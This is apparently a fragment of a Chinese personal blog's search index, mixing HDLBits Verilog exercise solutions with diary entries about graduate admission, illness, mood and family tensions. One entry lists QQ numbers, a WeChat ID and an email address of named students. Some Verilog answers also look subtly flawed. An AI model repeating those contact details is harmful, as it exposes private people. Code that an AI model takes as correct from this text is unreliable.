","date":"2025-04-07","objectID":"/verilog-language/:3:3","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#connecting-modules-by-name"},{"categories":["计算机体系结构"],"content":" 3.4 Three modules将顶层模块与3个D触发器的端口连接在一起： verilog module top_module ( input clk, input d, output q ); wire q2; wire q1; my_dff dff1(clk,d,q1); my_dff dff2(clk,q1,q2); my_dff dff3(clk,q2,q); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:4","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#three-modules"},{"categories":["计算机体系结构"],"content":" 3.5 Modules and Vectors verilog module top_module ( input clk, input [7:0] d, input [1:0] sel, output [7:0] q ); wire[7:0] q1; wire[7:0] q2; wire[7:0] q3; my_dff8 dff1(clk,d,q1); my_dff8 dff2(clk,q1,q2); my_dff8 dff3(clk,q2,q3); always @(*) case(sel) 2'b00: q \u003c= d; 2'b01: q \u003c= q1; 2'b10: q \u003c= q2; 2'b11: q \u003c= q3; endcase endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:5","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#modules-and-vectors"},{"categories":["计算机体系结构"],"content":" 3.6 Module add用2个16位加法器实现32位加法器： verilog module top_module( input [31:0] a, input [31:0] b, output [31:0] sum ); wire cin; wire cout; add16 adder1(a[15:0],b[15:0],sum[15:0],cin); add16 adder2(a[31:16],b[31:16],cin,sum[31:16],cout); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:6","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#module-add"},{"categories":["计算机体系结构"],"content":" 3.7 Module fadd实现1位全加器和32位加法器（2个16位加法器级联，已经实现），一位全加器的逻辑表达式如下： sum = a ^ b ^ cin cout = a\u0026b | a\u0026cin | b\u0026cin 代码如下： verilog module top_module ( input [31:0] a, input [31:0] b, output [31:0] sum );// wire cin; wire cout; add16 adder1(a[15:0],b[15:0],sum[15:0],cin); add16 adder2(a[31:16],b[31:16],cin,sum[31:16],cout); endmodule module add1 ( input a, input b, input cin, output sum, output cout ); // Full adder module here assign cout = a \u0026 b | a \u0026 cin | b \u0026 cin; assign sum = a ^ b ^ cin; endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:7","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#module-fadd"},{"categories":["计算机体系结构"],"content":" 3.8 Carry-select adder前面的加法器，需要等到低16位计算完成，得出carry后才能计算高16位，效率太低了。现在开发新的加法器，先把高16位有carry和没carry的情况都计算出来，然后根据低16位是否有carry，选择一个输出。代码如下： verilog module top_module( input [31:0] a, input [31:0] b, output [31:0] sum ); wire cin; wire cout1; wire cout2; wire[15:0] out1; wire[15:0] out2; add16 adder1(a[15:0],b[15:0],sum[15:0],cin); add16 adder2(a[31:16],b[31:16],out1,cout1); add16 adder3(a[31:16],b[31:16],out2,cout2); always @(*) case(cin) 1'b0: sum[31:16] \u003c= out1; 1'b1: sum[31:16] \u003c= out2; endcase endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:8","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#carry-select-adder"},{"categories":["计算机体系结构"],"content":" 3.9 Adder-subtractor对加法器进行变种，实现减法器。代码如下： verilog module top_module( input [31:0] a, input [31:0] b, input sub, output [31:0] sum ); wire [31:0] b_in; wire cout; wire cout2; assign b_in = b ^ {32{sub}}; add16 adder1(a[15:0],b_in[15:0],sub,sum[15:0],cout); add16 adder2(a[31:16],b_in[31:16],cout,sum[31:16],cout2); endmodule ","date":"2025-04-07","objectID":"/verilog-language/:3:9","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#adder-subtractor"},{"categories":["计算机体系结构"],"content":" 3.10 Module 总结 module的声明 module的连接：connect by name和connect by position vector和module的结合使用 always和case语句的使用 半加器，全加器，高校加法器，减法器的实现 ","date":"2025-04-07","objectID":"/verilog-language/:3:10","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#module-总结"},{"categories":["计算机体系结构"],"content":" 4 Procedures","date":"2025-04-07","objectID":"/verilog-language/:4:0","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#procedures"},{"categories":["计算机体系结构"],"content":" 4.1 always blocks (combinational)","date":"2025-04-07","objectID":"/verilog-language/:4:1","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#always-blocks-combinational"},{"categories":["计算机体系结构"],"content":" 4.2 always blocks (clocked)","date":"2025-04-07","objectID":"/verilog-language/:4:2","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#always-blocks-clocked"},{"categories":["计算机体系结构"],"content":" 4.3 if statement","date":"2025-04-07","objectID":"/verilog-language/:4:3","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#if-statement"},{"categories":["计算机体系结构"],"content":" 4.4 if statement latches","date":"2025-04-07","objectID":"/verilog-language/:4:4","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#if-statement-latches"},{"categories":["计算机体系结构"],"content":" 4.5 case statement","date":"2025-04-07","objectID":"/verilog-language/:4:5","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#case-statement"},{"categories":["计算机体系结构"],"content":" 4.6 priority encoder","date":"2025-04-07","objectID":"/verilog-language/:4:6","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#priority-encoder"},{"categories":["计算机体系结构"],"content":" 4.7 priority encoder with casez","date":"2025-04-07","objectID":"/verilog-language/:4:7","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#priority-encoder-with-casez"},{"categories":["计算机体系结构"],"content":" 4.8 avoiding latches","date":"2025-04-07","objectID":"/verilog-language/:4:8","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#avoiding-latches"},{"categories":["计算机体系结构"],"content":" 5 More Verilog Features","date":"2025-04-07","objectID":"/verilog-language/:5:0","series":["HDLBits"],"tags":["Verilog"],"title":"Verilog Language","uri":"/verilog-language/#more-verilog-features"},{"categories":["计算机体系结构"],"content":" 1 Getting Started让输出端口输出1，代码如下： verilog module top_module( output one ); // Insert your code here assign one = 1; endmodule ","date":"2025-04-07","objectID":"/getting-started/:1:0","series":["HDLBits"],"tags":["Verilog"],"title":"Getting Started","uri":"/getting-started/#getting-started"},{"categories":["计算机体系结构"],"content":" 2 Zero让输出端口输出0，代码如下： verilog module top_module( output zero );// Module body starts after semicolon assign zero = 0; endmodule ","date":"2025-04-07","objectID":"/getting-started/:2:0","series":["HDLBits"],"tags":["Verilog"],"title":"Getting Started","uri":"/getting-started/#zero"},{"categories":["计算机体系结构"],"content":" 3 总结Getting Started 部分就是个入门，两道题比较简单，总结来说Verilog有如下语法： verilog module top_module( output zero );// Module body starts after semicolon assign zero = 0; endmodule 使用module top_module(output zero);来声明模块，使用assign语句赋值，然后使用endmodule结束模块。 ","date":"2025-04-07","objectID":"/getting-started/:3:0","series":["HDLBits"],"tags":["Verilog"],"title":"Getting Started","uri":"/getting-started/#总结"},{"categories":null,"content":"大病初愈，元气恢复，开肝！~ 重要deadline及时间安排： 4月10日晚上8点半洗澡、洗袜子，9点睡觉； ✅ 2025-04-11 因为身体疾病，心里忧虑，加上来例假，睡得并不好 4月11日早上5点起床，12点之前把计算机学习任务全部完成，简历、CV、个人陈述、推荐信等其他材料全部搞定，然后投递港大； ✅ 2025-04-11 洗鼻子、洗脸刷牙、吃早饭，去银行充500元，路上联系老师询问推荐信的事情 ✅ 2025-04-11 时间晚了，投递失败了，很遗憾，以后不要卡ddl了 因为来例假了，体力不支。先爽快休息，恢复体力，等待例假过去，然后继续爆肝。 ✅ 2025-04-12 换衣服，去东湖徒步晒太阳，补充维生素D（希望身体快快好起来~） ✅ 2025-04-13 往后要提高身体素质该怎么做 每天一套帕梅拉腹部训练，阳光下跳一套T25健身操（25分钟），补充维生素D 每天吃维生素C：6片 保持心情愉快！不要内耗！ 本周总结：完成了一部分的任务，但是由于来例假，体力不支，再加上大病初愈，并没有能够完成更多的事情。但是本周我确定了我自己的目标，找到了我自己，接下来我要坚定的一步步地实现自己的人生目标。 ","date":"2025-04-07","objectID":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%BA%8C%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年4月第二周记录","uri":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%BA%8C%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":"本周的主要目标：完成第一阶段所有任务。 心理 \u0026 生活挑战 ✅ 2025-04-06 把新冠和细菌感染治疗完成，恢复身体健康 ✅ 2025-04-04 去医院看病，治疗好感冒 ✅ 2025-03-31 细菌+新冠混合感染，由于医生开的\"金叶败毒颗粒\"味道实在是恶心的叫人喝不下去，所以重新开了西药。这下要吃的要又多了几种。前两天还发誓不当药罐子，这下成了强化版药罐子了。 我要吃麦当劳！ ✅ 2025-03-31 今天3月3，妈妈让我买芥菜配土鸡蛋，我买成榨菜头子了。下次要注意。 好好休息一下，睡一觉，然后起来继续工作 ✅ 2025-03-31 上交软院和卫星所联培的导师了解 ✅ 2025-03-31 归琳（通信信号处理、移动通信网络） ✅ 2025-03-31 没学过这个方向，也真的不喜欢 杨旭波（图形学） ✅ 2025-03-31 只招博士 陈昊鹏（横向） ✅ 2025-03-31 放养，没名额了 肖双九（图形学） ✅ 2025-03-31 push 胡畔（知识表示与处理 智能信息系统建模 过程建模及优化） ✅ 2025-03-31 喝酒，实验室不太行 于晗（工业软件 知识图谱 流计算 软件互操作） ✅ 2025-03-31 实验室不太行 最终结论，真的不要去上交，真的不要去，确定不要去了； “出来混早晚都要还”致上海交大软件学院副院长-CSDN博客 通过这次考研学习到的经验：在对一件事情有滤镜的时候，最好全方位的把这件事情了解清楚，而不是闷头硬上，可能有很多你不知道的内情，或者你没有了解过的阴暗面；所以下次在对一件事情有滤镜的时候，一定要擦亮眼睛，多搜集信息了解情况，让滤镜逐步转化为真实的现实；在对情况有了深刻的了解后，做出的选择，才不后悔； 此外，多加入一些群聊，多在网上发帖，多和人交流信息，不要因为信息闭塞，在闹出这样的事情； 联系上交软院的学长学姐（QQ），打听一下情况 ✅ 2025-03-31 蔡文俊 1281005404 ✅ 2025-03-31 学长人非常好 剩下几位就不联系了 程荣鑫 2870508626 薛宇豪 467946553 杨逸存 QQ:1057206466 wx:yyccyy8668 吴静琦 1916496828@qq.com 洗鼻子 ✅ 2025-03-31 把鼻涕排出来 ✅ 2025-04-01 吃盐酸西替利琴，喝金银花露 ✅ 2025-04-01 洗澡睡觉，把病养好 ✅ 2025-04-01 今天是2025-4-1愚人节：最近情绪特别低落，不知道是因为新冠还是什么，感觉什么事情都不想干，干什么都没兴致。心情特别压抑，感觉自己没有未来，没有希望。 做事情时候应该采取的模式是：把接下来的目标和路径想清楚，列出来，然后专注的去做事情，不要再去想这个方向对不对，如果有不对，把所有事情做完了再来列举新的任务； 目标：要让人知道我是不可战胜、不可控制、不可欺负的，等到我恢复，一个全新的我会卷土重来，当年欺负过我的人都得向我低头； 针对高老头的方针 高老头的意见有用吗？-\u003e 没有 -\u003e 那就不用听啊！ 和高老头争论有用吗? -\u003e 没有 -\u003e 那还和他争论干嘛？ 高老头能控制你的行为吗？ 这取决于我，比如有的时候要我给他带早餐，我乖乖去了。 比如有的时候来我学校，打电话要我去接待他，我乖乖去了。 比如他逼我去看爷爷奶奶，我们乖乖去了。 那应该怎么办？拒绝听从他的指挥，给他提供服务！ 不给他带早餐； 不要给他开门； 拒绝看望爷爷奶奶； 不听他的任何话； 如果他使用吼叫或暴力等方式迫使你屈服怎么办？录下来，家庭精神暴力的证据； 如果他用孝道和金钱来进行要挟，怎么办？赶紧提升自己的实力，润到外地去，让他找不到； 如果他使用阿黄作为副手来进行操控怎么办？不理阿黄，阿黄不会拿我怎么样。 所有的场景都有对应的解决办法，那我还在忧虑什么？抓紧学习吧！ 终极奥义：提升能力，润到外地，切断联系； 我感觉最近不知道是因为新冠还是怎样，情绪特别低落，感觉身体软趴趴的没力气。该吃的药也吃了，但是可能吃的不够多，没有什么好转。我感觉最近特别消沉的是对自己的人生感到无力，不知道从哪里来，也不知道该往哪里去。或许我该试着把自己列定任务全部完成，然后看看能走到哪里。不能陷入习得性无助，一定要自己拯救自己。做完以后再做一个失业救助手册和心理救助手册，帮助更多的人走出来。 取悦别人已经太多了，是时候取悦我自己了。 经过了这么多事情，我应该明确的知道，不会有任何人真的帮助我，只有我自己可以帮助我自己走出低谷，只有我自己可以帮助我自己获得成功。不要再渴望从别人那里获得帮助，救你自己！ 软院导师具体情况详细了解完成，确定要不要去 ✅ 2025-03-31 算一下钱的数目，和需要用钱的项目 ✅ 2025-04-01 清点家里药品：只缺生长因子和维生素C OTC ✅ 2025-04-01 如何省钱 早餐在家里吃 其他时间都呆在家里，不出门 购买维生素C，生长因子 ✅ 2025-04-01 把药物分一下类 ✅ 2025-04-01 先把新冠的药、玫瑰痤疮的药挑出来吃了，先不进行护肤活动，优先治疗玫瑰痤疮 ✅ 2025-04-01 不想太多，先把所有自己能想到的任务全部做完，然后再去操心生活。（或许做完以后就没有什么好操心的了呢） 学习如何睡觉，舒舒服服的不带任何想法的睡一觉 ✅ 2025-04-02 起来以后把新冠、细菌感染和玫瑰痤疮的药吃掉 ✅ 2025-04-02 玫瑰痤疮治疗 每天早上先涂抹复方乳膏，隔半小时后，清水洗脸，涂抹生长因子，最后涂抹维生素E乳，然后吃金花消痤丸 新冠治疗 药片+阿莫西林+金银花露一天3次（早中晚各一次），睡前吃西替利琴 基本呆在家里完成相关任务，不要出门，在家休息即可 鼻子洗干净，吃晚饭，吃药 ✅ 2025-04-02 今天晚上好好休息，不学习了，10点睡觉，睡满8小时 ✅ 2025-04-04 洗脸刷牙，吃药涂药，去银行充钱，去省图书馆还书 ✅ 2025-04-04 总结：本周主要是处于生病的状态，整体的身体条件比较虚弱，因此总体效率不是特别高。主要做的都是一些杂事，没有做什么特别厉害的事情。希望下个星期可以效率高起来。这个星期武汉的天气真的很不错，所以清明节也出去骑车爬山了，感觉情绪的问题好了很多，很开心。 ","date":"2025-03-31","objectID":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%B8%80%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年4月第一周记录","uri":"/2025%E5%B9%B44%E6%9C%88%E7%AC%AC%E4%B8%80%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":"今天是2025年3月29号，刚刚电院的复试结果出来了，我成功录取到了上海交大软件学院。悲哀的是，我无法录取到本部，因此也无法进入ipads了。本来我想着，如果不能录取到ipads，应该会有其他的实验室比较好的吧。结果上网一搜，发现其他实验室符合如下特征： 做计算机图形学和动画的； 做横向，前后端的。我真的不想做横向，呜呜呜； 做很过时的软件建模理论，软件架构模型； 酒鬼博导：拉着学生喝酒，甭管男女都得陪他喝； 态度极差的压榨狂，完全不拿学生当人； 自己学术造假的博导，甚至手把手教学生造假； 校外的509研究所符合如下特征： 工作累，压力大，杂活多，早出晚归，都是搞项目，没时间科研； 本来考上了交大，觉得挺开心的。这么一搜，感觉天都塌了，感觉好像做什么事情都失去了兴致，像是整个人被抽干了。一个正常的、积极的、明朗的、朝气蓬勃的科研环境，难道就这么难吗？一个有学术潜力的科研课题组，难道就这么难找？一整个学院就只有一个实验室是有潜力，有活力的吗？难道我要把人生这么宝贵的2.5年，都花在这样的环境里面？啊？ 不行，我一定要想个办法。我要做系统软件的研究，我不要在那样乌烟瘴气的环境下生存。我不要花2.5年的宝贵青春，在一个毫无希望和光明的地方，熬成一个技术水平稀巴烂的黄脸婆。 就按照任务列表继续推进！努力抵达MIT的终点！只要我够努力，一定是可以的！加油！奥里给！ ","date":"2025-03-29","objectID":"/%E5%BD%95%E5%8F%96%E5%90%8E%E7%9A%84%E8%BF%B7%E8%8C%AB/:0:0","series":["记录"],"tags":null,"title":"录取后的迷茫","uri":"/%E5%BD%95%E5%8F%96%E5%90%8E%E7%9A%84%E8%BF%B7%E8%8C%AB/#"},{"categories":null,"content":"记录本人2025年3月第四周的一些任务、心情、总结","date":"2025-03-25","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/","series":["记录"],"tags":null,"title":"2025年3月第四周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/"},{"categories":null,"content":" 昨天睡得软床，感觉整个人睡不好，而且起来以后身体很累。跟前台说换了硬床垫。 ✅ 2025-03-24 预约今日交大进校 ✅ 2025-03-24 感觉自己身体比较虚，必须要去吃点东西（7点40之前吃完） ✅ 2025-03-24 把上机考试的资料全部准备好 ✅ 2025-03-24 所有算法相关教材下载 ✅ 2025-03-24 所有课程的网址和对应资料 ✅ 2025-03-24 google style guide 配置 ✅ 2025-03-24 CMake环境配置完成 ✅ 2025-03-24 OI-wiki ✅ 2025-03-24 C++编程环境 ✅ 2025-03-24 12点出发去玉兰苑吃午饭 ✅ 2025-03-24 快速吃完午饭，骑车出去发东下院，先把机房位置弄清楚 ✅ 2025-03-24 12：45参加资格审查，进入机房后，继续上机学习 ✅ 2025-03-24 1点半开始考试，3个小时交卷 ✅ 2025-03-24 直到最后才想出怎么做，思路都写出来了，代码没写完，完蛋了完蛋了，呜呜呜呜呜 保洁阿姨没法换床垫，我自己给换了，还把床给铺了。剧然能养成这种技能，我自己都觉得不可思议。 ✅ 2025-03-24 调整一下心态，一直到5点50。5点50开始继续我的学习，不要放弃，一定要坚持。 ✅ 2025-03-24 洗漱，9点睡觉 ✅ 2025-03-25 12点10分出发去软件大楼，中途去打印店打印5份简历，大约12点20到 ✅ 2025-03-25 心理 \u0026 生活任务 ✅ 2025-03-30 在有挑战时快速调整自己的心态，重新出发 ✅ 2025-03-29 勇敢的决定休息，并投入一次彻底的睡眠 ✅ 2025-03-24 床垫太软了，睡一觉起来不舒服，跟前台说换了硬的。今天晚上应该能睡得好一些。 在压力大时成功完成一次心理调适，将对压力的不适转换为对挑战的兴奋 ✅ 2025-03-24 学会享受洗澡 ✅ 2025-03-30 学会享受睡觉 ✅ 2025-03-30 自信的去参加一次面试，勇敢的向老师陈述自己的情况 ✅ 2025-03-25 时间挑战 ✅ 2025-03-26 9点20之前完成洗漱，并且直接关灯上床睡觉，盖被子之后不再去想现实生活中的任何事情，做到彻底的断舍离 ✅ 2025-03-24 提前熟悉一下自己准备的资料 ✅ 2025-03-24 参加机试 ✅ 2025-03-24 简历制作打印，一式五份 ✅ 2025-03-25 准备各个复试问题 ✅ 2025-03-25 吃荨麻疹药物 ✅ 2025-03-25 洗漱一下，放松15分钟 ✅ 2025-03-26 收拾一下东西 ✅ 2025-03-27 计算一下明天去火车站的时间 ✅ 2025-03-25 1点54发车 1点40开始检票 11点50就要坐公交出发 7点钟进校吃早饭，11点10出发回来，11点30回到酒店 明天早上预定交大的进校 ✅ 2025-03-27 回家 ✅ 2025-03-27 收拾东西，整理行李 ✅ 2025-03-27 换洗衣物 ✅ 2025-03-28 杂事做完 ✅ 2025-03-29 洗鼻子 ✅ 2025-03-29 吃药（消化药） ✅ 2025-03-29 洗脸刷牙涂香香 ✅ 2025-03-29 把补交的文件拍下来发给庄老师 ✅ 2025-03-29 读一下联培基地招生简章 ✅ 2025-03-29 咨询庄老师和马老师联培相关的事宜 ✅ 2025-03-29 选择导师的问题：和本部是否是同样选择导师，还是有特定的导师 ✅ 2025-03-29 咨询马老师：是否一定要去联培基地学习，研究所和企业的研究是否有差别，如果有了更好的实习单位，可以食宿自理的话，能否不去联培基地 ✅ 2025-03-29 找到软件学院所有导师的名单 ✅ 2025-03-29 加考研辅导学长微信，咨询找导师事宜 ✅ 2025-03-29 上导师评价网搜索导师评价 ✅ 2025-03-29 上谷歌学术看导师论文和引用 ✅ 2025-03-29 列出一个可选的导师联系列表 ✅ 2025-03-29 ipads实验室老师 戚正伟 等录取名单出来后，发邮件联系ipads导师，看是否接受联培学生，以及博士申请的事宜 ✅ 2025-03-29 对照剩下的列表，发邮件联系导师，和导师交流看看情况 ✅ 2025-03-29 列出一个接下来的行动计划，最后目的是申请到MIT的phD ✅ 2025-03-29 依照任务列表推进进度 考虑一下研究生期间如何保证不受到欺负和威胁，以及如何努力才能进入MIT读博 ✅ 2025-03-29 技术能力及其强悍，能够做大型项目（第一阶段任务） 有多篇系统方向顶级会议论文（第二阶段任务） 在企业能有突出成就（第一阶段任务） 在开源社区有较大声望，非常出名（第一阶段任务） 外貌好，长得漂亮（第一阶段任务） 体格强劲，有一身肌肉（第一阶段任务） 自主性强，脸皮厚，能主动联系他人社交，为达到目的能做出极大努力（现在就能做到） ✅ 2025-03-29 不怕事，不怕别人欺负，有底气跟人硬刚 ✅ 2025-03-29 这依赖于前面的能力带来的自信 再洗一次鼻子，吃感冒药，把身体调整好再来完成学习任务 ✅ 2025-03-29 好好洗个澡 ✅ 2025-03-30 舒舒服服睡一觉吧，什么都不要想，身体恢复好了以后积极努力，改变人生 ✅ 2025-03-30 半夜鼻涕直往嗓子里流，嗓子痛的一批，一晚上没睡好 我要像施瓦辛格一样强壮！我再也不要当身体虚弱的药罐子了！我要像正常人一样充满活力！充满激情！ 感谢我的朋友们对我的支持和鼓励，我永远感激他们！ 吃感冒药，洗一次鼻子 ✅ 2025-03-30 去东湖骑车爬山，调节一下心情，顺带运动治疗鼻炎和感冒 ✅ 2025-03-30 回来以后抓紧完成第一阶段所有任务，早完成早点走上顺利的人生道路 见鬼，骑车以后病更严重了 总结： 这个星期主要是三件事： 在上海参加机试和复试，以及返程 考研录取及导师联系 发烧感冒生病 总体而言效率不高，情绪波动较大，身体较差。下一阶段要提升身体素质，提高效率，完成所有任务。 ","date":"2025-03-25","objectID":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/:0:0","series":["记录"],"tags":null,"title":"2025年3月第四周记录","uri":"/2025%E5%B9%B43%E6%9C%88%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%AE%B0%E5%BD%95/#"},{"categories":null,"content":"流水账记录这两天在上交软院复试的所见所闻及感悟","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/"},{"categories":null,"content":"从19号接到复试通知，到今天复试结束，一切都像一场梦一样。有焦虑、痛苦，也有感动、温暖，想要在这里记录一下，并且感谢所有支持过我的人。人生永远没有悲剧，不可放弃任何向上的机会。在机会来临前玩命努力，才对得起它的到来。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:0:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#"},{"categories":null,"content":" 1 上交软院之梦在我大一那年，本来就读的是给排水科学与工程专业，而后在学习大学计算机基础课程时，偶然读到了一本《操作系统概念》，从此萌发了学习计算机科学的梦想。而后自己找了本《C primer plus》，自学了C语言和数据结构。再卷了一把绩点，成功从给排水科学与工程转入了计算机专业。 进去以后本来想的是学系统软件，结果在同学和老师的带领下搞了机器学习和深度学习。当时所有人都在说机器学习和深度学习多好，我进去以后跟着学了python，学了很多基础机器学习算法，学了吴恩达Coursera上的课程，还有好多好多。学院的培养方案更贴近嵌入式和硬件，所以我还学了单片机开发。跟着电子信息社团的同学学习了如何焊面包板。跟着打了数学建模竞赛，拿了国家级二等奖。跟着打了智能汽车竞赛，也拿了国家级二等奖。顺带又拿下了计算机设计竞赛国家级三等奖。此外，学习了安卓软件开发，Web前后端开发。 一切好像都很美好，好像自己非常厉害。但是我自己深刻的意识到自己到底有多菜。我从未有过扎实的数理基础，我从未有过扎实的算法基础，我从未有过扎实的系统基础。我们大一时候的数学培养，考试是非常简单的，因此懈怠了对数学基础的培养。算法课上的很随便，数据结构课程没有教过更高级的数据结构，总是在栈、队列等几个之间打转，而且没有像样的配套项目。最抽象的就是，我们学院对于系统软件方面的教学，就是纯纯的教概念，用的是经典的\"十二五教材\"。 经过了两年的培养，我是真的不想继续搞机器学习和深度学习了（哪怕很热门，但是我看见那些顶会，我就觉得崩溃）当然，如果是机器学习和深度学习能和系统方向结合，就更好了。之前恍然间了解到了美国大学的课程培养计划，我自己就拟定了一个计划，根据这个方案来彻底重学哪些课程。我再也不想让我自己心虚，让我自己难受，我要彻底地成为系统巨佬。 在毕业后的快两年里，我一直努力的推进我这个计划。但是很多时候因为身体疾病的原因，效率非常低下，而且心理状态曾经出现过很大的问题。在去年10月我申请学校之时，我的朋友告诉我可以试着考一下交大软院，因此我报名了研究生考试。经过查找资料，我发现交大软院进行过激进的教学改革，使用了很多国外大学的网络课程，去培养他们的学生，为学生打下了坚实的基础。这让我觉得非常之羡慕，我在本科期间总是去问老师，老师把我扫地出门。问过同学，但是同学里面没有会的。没有学长，没有助教，身边没有可以讨论的人，很多时候感觉非常的孤独。后来遇到了重庆大学的学长，但是学长因为跟我闹了矛盾，把我删除了。去年十月份，我还对自己的水平挺有自信，想着先把《计算理论》和《计算复杂性理论》复习完，再来复习考研数学。最后的结果就是进度超出了我的预计，再加上之前的数学基础本就不是很好，考研时候迎来了彻底的数学滑坡。 意外的是，我竟然通过了国家线，在一个月前我完全没有想到，甚至连分数都不敢查。而在近一个月后，我接到了复试通知，告诉我要来上海交通大学参加复试。作为一个普通一本学校的学生，我从未想过自己能到顶级双一流高校参加复试，而且是心心念念的软件学院，好像自己做系统研究的梦想近在眼前。我曾经查阅过他们的招生简章，其中写的是要求双一流本科学校的优秀学生。而我就是个普通一本学校的普通学生，只不过有一些国奖，一些数学建模竞赛国奖而已。我一方面为了进入复试而感到欣喜，包括我的朋友们也如此觉得，另一方面我又为了自己当前的能力不足而感到自卑和焦虑。如果我在软院老师面前表现不好怎么办？成绩很差怎么办？他们会不会对我印象不好？焦虑的我决定赶紧猛干一把，给软院老师留下个好印象。这样做的目的好像都不是因为系统研究了，是因为我好面子、要尊严。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:1:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#上交软院之梦"},{"categories":null,"content":" 2 复试前的焦虑23号之前，我就觉得非常焦虑，总觉得自己复习不完了，事情干不完了。每次散个步都觉得实在是对不起自己，睡个觉总觉得自己是不是在浪费时间，是不是该爬起来。甚至浪费了学习时间，天天都在咨询deepseek身体问题和心理问题。在此之前，我从未一个人单独出过远门，从未自己订过酒店，从未自己打包过行李。可能是因为我家人一直非常关照我，把我保护的很好。我的朋友们也很好，一直在鼓励我，所以我虽然心理健康，但是自理能力比较低下，而且总是像个嗷嗷待哺的小孩，遇到一点点困难就垂头丧气，心情低落，要掉眼泪，闹着要回家，闹着要找妈妈，要朋友鼓励和抱抱。我收拾好了行李，但是不确定是不是真的收拾好了（事实证明确实有东西漏掉了，但是上交老师很耐心，让我回去补上就好）。对自己的知识水平没把握，几个朋友一直在给我打气。经过几天的焦虑和不怎么平稳的复习，终于到了23号早上出发的日子。 ","date":"2025-03-25","objectID":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/:2:0","series":["记录"],"tags":null,"title":"上交软院复试记","uri":"/%E4%B8%8A%E4%BA%A4%E8%BD%AF%E9%99%A2%E5%A4%8D%E8%AF%95%E8%AE%B0/#复试前的焦虑"},{"categories":null,"content":" 3 23号：痛苦的开始23号早上6点我就起床了，装作镇定地和妈妈聊天，吃了早饭，然后就出发了。到了武汉站的时候已经下起了雨，再过十几分钟就要发车了，而我还没找到进站口。从地铁上去以后，在大厅转了一圈，找到了安检口的姐姐，姐姐告诉我从大门出去，坐电梯上三楼就是。哇，好感动。我就赶紧到外面去坐电梯，坐电梯的时候还一直在想会不会表现不好丢人（唉，这要命的心态），想着我到底该怎么表现。一上高铁，看见一个大哥坐我位置上。我说大哥，这个是我的位置，大哥很好，立马跟我说坐错了，还帮我把行李搬上去了。结果我想把CSAPP拿出来，大哥又帮我拿了下来，再放了上去（真心感谢大哥）。后来三个小时在高铁上，本来是想看书的，结果人真心难受，感觉胃里恶心，怎么坐都不舒服。但是群里的群友们一直在鼓励我，给我打气，给我想办法（真的很感谢他们）。我因为复试紧张，总觉得自己能力不行，群友们说我心态要调整，我也是这么觉得的。 后来一路晕到了上海虹桥，一出来发现上海地铁站真的好大好宽敞（乡下人进城了）后来坐地铁，急刹车和急启动多，每次出现我就一阵恶心。中间拖着虚弱的身体在娄山关站换乘，换乘的时候还在想自己复试该怎么办，预演老师会问些什么，我应该怎么答。苟了十几站，终于到了终点站，紫竹高新区。 